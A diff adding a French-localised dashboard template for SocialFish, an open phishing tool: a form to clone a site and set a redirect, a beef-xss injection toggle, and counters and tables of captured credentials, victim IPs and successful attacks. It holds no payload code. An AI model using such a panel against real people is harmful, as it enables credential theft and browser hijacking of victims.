@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="SocialFish">
+    <meta name="author" content="UndeadSec">
+    <meta name="keywords" content="SocialFish">
+    <title>SocialFish Neptune</title>
+    <link href="/css/font-face.css" rel="stylesheet" media="all">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+    <link href="/vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
+    <link href="/vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">
+    <link href="/css/theme.css" rel="stylesheet" media="all">
+</head>
+<body class="animsition">
+<script>
+function toggleCustom() {
+    if (document.getElementById('status').value != 'custom'){
+        document.getElementById('status').value = 'custom';
+    }else{
+        document.getElementById('status').value = 'clone';
+    }
+    if (document.getElementById('clone').disabled){
+        document.getElementById('clone').disabled = false;
+    }else{
+        document.getElementById('clone').disabled = true;
+    }
+}
+function toggleBeef() {
+    if (document.getElementById('beef').value != 'yes'){
+        document.getElementById('beef').value = 'yes';
+    }else{
+        document.getElementById('beef').value = 'no';
+    }
+}
+</script>
+<script>
+function showSuccess() {
+  alert("Succès !")
+}
+</script>
+    <div class="page-wrapper">
+        <div class="page-content--bgf7">
+            <section class="au-breadcrumb2">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="au-breadcrumb-content">
+                                <div class="au-breadcrumb-left">
+                                    <h1><a href="https://github.com/UndeadSec/SocialFish" target="_blank" style="color:#393939"><i class="fas fa-fish"></i>SocialFish</a></h1>
+                                    <span class="au-breadcrumb-span">URL de vos attaques :</span>
+                                    <ul class="list-unstyled list-inline au-breadcrumb__list">
+                                        <li class="list-inline-item"><a href="http://0.0.0.0:5000" target="_blank" rel="nofollow"><b> http://0.0.0.0:5000</b></a></li>
+                                    </ul>
+                                </div>
+                                <form class="au-form-icon--sm" action="/configure" method="POST" onsubmit="showSuccess()">
+                                    <input class="au-input--w300 au-input--style2" name="url" id="clone" type="text" placeholder="Cloner" autocomplete="off" required="">
+                                    <input class="au-input--w300 au-input--style2" name="red" type="text" placeholder="Redirection" autocomplete="off" required="">
+                                    <input type="hidden" name="beef" id="beef" value="no">
+                                    <input type="hidden" name="status" id="status" value="clone">
+                                    <button class="au-btn--submit2" type="submit">
+                                        <i class="zmdi zmdi-flash"></i>
+                                    </button>
+                                </form>
+                            </div>
+                            <div style="text-align: right; margin-top: 30px;">
+                                <small>HTML personnalisé</small>
+                                <label class="switch switch-text switch-info switch-pill">
+                                  <input type="checkbox" class="switch-input" onclick="toggleCustom()">
+                                  <span data-on="On" data-off="Off" class="switch-label"></span>
+                                  <span class="switch-handle"></span>
+                                </label>
+                                <small> Injecter beef-xss</small>
+                                <label class="switch switch-text switch-info switch-pill">
+                                  <input type="checkbox" class="switch-input" onclick="toggleBeef()">
+                                  <span data-on="On" data-off="Off" class="switch-label"></span>
+                                  <span class="switch-handle"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section class="welcome p-t-10">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div style="text-align: right;">
+                                <button type="button" class="btn btn-primary" style="margin: 2px;" onclick="location.href='/mail'"><i class="fas fa-envelope"></i>&nbsp; Envoyer un e-mail</button>
+                                <button type="button" class="btn btn-info" style="margin: 2px;" onclick="location.href='/report'"><i class="fas fa-file-alt"></i>&nbsp; Générer un rapport</button>
+                            </div>
+                            <hr class="line-seprate">
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section class="statistic statistic2">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--green">
+                                <h2 class="number">{{clicks}}</h2>
+                                <span class="desc">clics</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-mouse"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--orange">
+                                <h2 class="number">{{countNotPickedUp()}}</h2>
+                                <span class="desc">visiteurs non capturés</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-mood-bad"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--blue">
+                                <h2 class="number">{{countCreds()}}</h2>
+                                <span class="desc">identifiants capturés</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-calendar-note"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--red">
+                                <h2 class="number">{{attacks}}</h2>
+                                <span class="desc">attaques lancées</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-fire"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section class="p-t-20">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <h3 class="title-5 m-b-35">Attaques réussies</h3>
+                            <div class="table-responsive table-responsive-data2">
+                                <table class="table table-data2">
+                                    <thead>
+                                        <tr>
+                                            <th>URL</th>
+                                            <th>IP</th>
+                                            <th>Date</th>
+                                            <th>Journal des données</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        {% for item in data %}
+                                        <tr class="tr-shadow">
+                                            <td><span class="block-email">{{item[1].replace('http://','').replace('https://', '')[:30]}}</span></td>
+                                            <td>{{item[6]}}
+                                                <a href="trace/{{item[6]}}" target="_blank" rel="nofollow">
+                                                <button type="button"><small><i class="fas fa-eye"></i> TRACER</small></button>
+                                                </a>
+                                            </td>
+                                            <td><i class="far fa-calendar-alt"></i> {{item[2]}}</td>
+                                            <td>
+                                                <a href="single/{{item[0]}}" target="_blank" rel="nofollow">
+                                                    <button type="button"><i class="fas fa-search"></i> Voir</button>
+                                                </a>
+                                            </td>
+                                        </tr>
+                                        <tr class="spacer"></tr>
+                                        {% endfor %}
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section class="p-t-60 p-b-20">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="copyright">
+                                <p>Copyright © 2019 UndeadSec. Tous droits réservés.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+    <script src="/vendor/jquery-3.2.1.min.js"></script>
+    <script src="/vendor/bootstrap-4.1/popper.min.js"></script>
+    <script src="/vendor/bootstrap-4.1/bootstrap.min.js"></script>
+</body>
+</html>
